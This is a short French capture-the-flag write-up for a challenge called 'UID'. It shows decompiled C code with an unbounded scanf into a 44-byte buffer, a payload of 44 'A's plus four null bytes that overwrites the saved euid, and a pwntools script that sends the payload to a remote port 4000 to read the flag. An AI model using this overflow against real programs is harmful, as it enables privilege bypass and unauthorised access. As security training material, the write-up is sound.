# UID

En reversant le programme avec ghidra, nous avons : 

```c
undefined8 main(void)

{
  undefined local_38 [44];
  __uid_t local_c;
  
  local_c = geteuid();
  printf("username: ");
  fflush(stdout);
  __isoc99_scanf(&DAT_0010200f,local_38);
  if (local_c == 0) {
    system("cat flag.txt");
  }
  else {
    system("cat flop.txt");
  }
  return 0;
}
```

On voit déjà la fonction scanf qui peut provoquer des buffer overflows. Le but ici serait de réécrire par dessus la variable local_c afin d'obtenir le flag. Nous voyons également que le buffer a une taille allouée de 44. 

Ainsi notre payload serait de cette forme : 

A*44 + \x00\x00\x00\x00

Testons ! 

```
import pwn

def exploit():
    conn = pwn.remote(IP,4000)
    while conn.can_recv(timeout=1):
        conn.sendlineafter("username:",'A'*44+'\x00\x00\x00\x00')
        conn.interactive()

exploit()
```

et hop ! ça marche directement on a le flag ! 